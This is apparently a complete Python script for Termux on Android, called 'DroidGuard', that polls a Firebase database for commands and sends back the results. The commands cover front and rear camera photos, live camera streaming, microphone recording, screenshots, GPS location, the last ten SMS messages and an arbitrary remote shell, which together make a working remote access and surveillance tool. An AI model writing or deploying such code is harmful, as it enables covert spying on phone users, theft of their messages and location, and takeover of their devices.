#!/data/data/com.termux/files/usr/bin/python
import time, requests, hashlib, os, json, subprocess, base64, threading

FIREBASE_URL = "https://droidguard-10597-default-rtdb.firebaseio.com/"

# Gerar ID único baseado no hardware
device_id = hashlib.md5(os.uname().nodename.encode() + str(os.path.getsize("/system/build.prop")).encode()).hexdigest()[:8]

print(f"\n{'='*50}")
print(f"🟢 DROIDGUARD ATIVO")
print(f"📱 ID: {device_id}")
print(f"{'='*50}\n")

# Variáveis para streaming
streaming_ativo = False
streaming_frame = None

def tirar_foto(tipo="front"):
    arquivo = f"/sdcard/dg_{int(time.time())}.jpg"
    cam = "1" if tipo == "front" else "0"
    try:
        subprocess.run(f"termux-camera-photo -c {cam} {arquivo}", shell=True, timeout=5)
        with open(arquivo, "rb") as f:
            foto = base64.b64encode(f.read()).decode()
        os.remove(arquivo)
        return foto
    except:
        return None

def stream_camera(tipo="front", duracao=30):
    """Stream ao vivo da câmera"""
    global streaming_ativo, streaming_frame
    streaming_ativo = True
    cam = "1" if tipo == "front" else "0"
    arquivo = "/sdcard/dg_stream.jpg"
    
    for _ in range(duracao):
        if not streaming_ativo:
            break
        try:
            subprocess.run(f"termux-camera-photo -c {cam} {arquivo}", shell=True, timeout=2)
            with open(arquivo, "rb") as f:
                streaming_frame = base64.b64encode(f.read()).decode()
            time.sleep(1)
        except:
            pass
    streaming_ativo = False
    return {"status": "stream_fim"}

def gravar_audio(duracao=10):
    arquivo = f"/sdcard/dg_audio_{int(time.time())}.aac"
    try:
        subprocess.run(f"termux-microphone-record -f {arquivo} -d {duracao}", shell=True, timeout=duracao+3)
        with open(arquivo, "rb") as f:
            audio = base64.b64encode(f.read()).decode()
        os.remove(arquivo)
        return audio
    except:
        return None

def executar_comando(cmd):
    acao = cmd.get("acao")
    params = cmd.get("params", {})
    
    print(f"🎯 {acao}")
    
    if acao == "ping":
        return {"pong": time.time()}
    
    elif acao == "info":
        return {"device_id": device_id, "bateria": obter_bateria()}
    
    elif acao == "foto_frontal":
        foto = tirar_foto("front")
        return {"foto": foto} if foto else {"erro": "falha"}
    
    elif acao == "foto_traseria":
        foto = tirar_foto("rear")
        return {"foto": foto} if foto else {"erro": "falha"}
    
    elif acao == "screenshot":
        arquivo = f"/sdcard/dg_screen_{int(time.time())}.png"
        try:
            subprocess.run(f"termux-screenshot {arquivo}", shell=True, timeout=5)
            with open(arquivo, "rb") as f:
                screen = base64.b64encode(f.read()).decode()
            os.remove(arquivo)
            return {"screen": screen}
        except:
            return {"erro": "screenshot"}
    
    elif acao == "gps":
        try:
            r = subprocess.run("termux-location -p network", shell=True, capture_output=True, text=True, timeout=8)
            if r.returncode == 0:
                gps = json.loads(r.stdout)
                return {"latitude": gps.get("latitude"), "longitude": gps.get("longitude")}
        except:
            pass
        return {"erro": "gps"}
    
    elif acao == "bateria":
        return {"percentage": obter_bateria()}
    
    elif acao == "vibrar":
        subprocess.run(f"termux-vibrate -d {params.get('duracao', 500)}", shell=True)
        return {"status": "ok"}
    
    elif acao == "falar":
        texto = params.get("texto", "")[:100]
        subprocess.run(f'termux-tts-speak "{texto}"', shell=True)
        return {"status": "ok"}
    
    elif acao == "gravar_audio":
        audio = gravar_audio(params.get("duracao", 10))
        return {"audio": audio} if audio else {"erro": "audio"}
    
    elif acao == "start_stream":
        tipo = params.get("tipo", "front")
        duracao = params.get("duracao", 30)
        threading.Thread(target=stream_camera, args=(tipo, duracao)).start()
        return {"status": "stream_iniciado", "duracao": duracao}
    
    elif acao == "get_stream_frame":
        global streaming_frame
        if streaming_frame:
            return {"frame": streaming_frame}
        return {"frame": None}
    
    elif acao == "stop_stream":
        global streaming_ativo
        streaming_ativo = False
        return {"status": "stream_parado"}
    
    elif acao == "listar_sms":
        try:
            r = subprocess.run("termux-sms-list -l 10", shell=True, capture_output=True, text=True)
            if r.returncode == 0:
                sms_list = json.loads(r.stdout)
                return {"sms": [{"numero": s.get("number"), "texto": s.get("body")[:100], "data": s.get("received")} for s in sms_list[:10]]}
        except:
            pass
        return {"sms": []}
    
    elif acao == "shell":
        try:
            cmd = params.get("cmd", "")[:200]
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            return {"stdout": r.stdout[:1000], "stderr": r.stderr[:500]}
        except:
            return {"erro": "timeout"}
    
    return {"erro": f"desconhecido: {acao}"}

def obter_bateria():
    try:
        r = subprocess.run("termux-battery-status", shell=True, capture_output=True, text=True)
        if r.returncode == 0:
            return json.loads(r.stdout).get("percentage", 0)
    except:
        pass
    return 0

# Loop principal
while True:
    try:
        # Buscar comandos
        r = requests.get(f"{FIREBASE_URL}/comandos/{device_id}.json", timeout=5)
        if r.status_code == 200 and r.json():
            for cmd_id, cmd in r.json().items():
                resultado = executar_comando(cmd)
                resultado["timestamp"] = time.time()
                requests.put(f"{FIREBASE_URL}/resultados/{device_id}/{cmd_id}.json", json=resultado)
                requests.delete(f"{FIREBASE_URL}/comandos/{device_id}/{cmd_id}.json")
        
        # Atualizar status
        requests.patch(f"{FIREBASE_URL}/dispositivos/{device_id}.json", 
                      json={"status": "online", "timestamp": time.time(), "bateria": obter_bateria()}, timeout=3)
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ {e}")
        time.sleep(5)
